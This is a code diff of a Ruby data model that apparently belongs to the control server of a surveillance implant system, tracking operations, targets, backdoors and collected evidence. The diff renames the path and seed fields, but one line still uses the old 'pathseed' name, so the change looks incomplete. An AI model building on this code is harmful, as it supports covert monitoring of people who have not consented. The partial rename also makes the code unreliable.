@@ -9,7 +9,7 @@ class Item
   field :desc, type: String
   field :status, type: String
   field :_kind, type: String
-  field :_path, type: Array
+  field :path, type: Array
 
   # operation
   field :contact, type: String
@@ -23,7 +23,7 @@ class Item
   field :deleted, type: Boolean
   field :uninstalled, type: Boolean
   field :counter, type: Integer
-  field :pathseed, type: String
+  field :seed, type: String
   field :confkey, type: String
   field :logkey, type: String
   field :demo, type: Boolean
@@ -40,7 +40,7 @@ class Item
   embeds_many :download_requests, class_name: "DownloadRequest"
   embeds_many :upgrade_requests, class_name: "UpgradeRequest"
   embeds_many :upload_requests, class_name: "UploadRequest"
-
+  
   embeds_one :stat
 
   embeds_many :configs, class_name: "Configuration"
@@ -62,7 +62,7 @@ class Item
     case self._kind
       when 'operation'
         self.stat.size = 0; self.stat.grid_size = 0; self.stat.evidence = {}
-        targets = Item.where(_kind: 'target').also_in(_path: [self._id])
+        targets = Item.where(_kind: 'target').also_in(path: [self._id])
         targets.each do |t|
           self.stat.evidence.merge!(t.stat.evidence) {|k,o,n| o+n }
           self.stat.size += t.stat.size
@@ -71,7 +71,7 @@ class Item
         self.save
       when 'target'
         self.stat.grid_size = 0; self.stat.evidence = {}
-        backdoors = Item.where(_kind: 'backdoor').also_in(_path: [self._id])
+        backdoors = Item.where(_kind: 'backdoor').also_in(path: [self._id])
         backdoors.each do |b|
           self.stat.evidence.merge!(b.stat.evidence) {|k,o,n| o+n }
           self.stat.grid_size += b.stat.grid_size
@@ -96,7 +96,7 @@ class Item
     backdoor.name = self[:build] + " (#{self[:counter]})"
     backdoor.type = self[:type]
     backdoor.desc = self[:desc]
-    backdoor[:_path] = self[:_path]
+    backdoor[:path] = self[:path]
     backdoor.confkey = self[:confkey]
     backdoor.logkey = self[:logkey]
     backdoor.pathseed = self[:pathseed]
@@ -128,15 +128,15 @@ class Item
     case self._kind
       when 'operation'
         # destroy all the targets of this operation
-        Item.where({_kind: 'target', _path: [ self._id ]}).each {|targ| targ.destroy}
+        Item.where({_kind: 'target', path: [ self._id ]}).each {|targ| targ.destroy}
       when 'target'
         # destroy all the backdoors of this target
-        Item.where({_kind: 'backdoor'}).also_in({_path: [ self._id ]}).each {|bck| bck.destroy}
+        Item.where({_kind: 'backdoor'}).also_in({path: [ self._id ]}).each {|bck| bck.destroy}
         # drop the collection
         Mongoid.database.drop_collection Evidence.collection_name(self._id.to_s)
       when 'backdoor'
         # destroy all the evidences
-        Evidence.collection_class(self._path.last).where(item: self._id).each {|ev| ev.destroy}
+        Evidence.collection_class(self.path.last).where(item: self._id).each {|ev| ev.destroy}
         # drop all grid items
         GridFS.instance.delete_by_backdoor(self._id.to_s)
     end
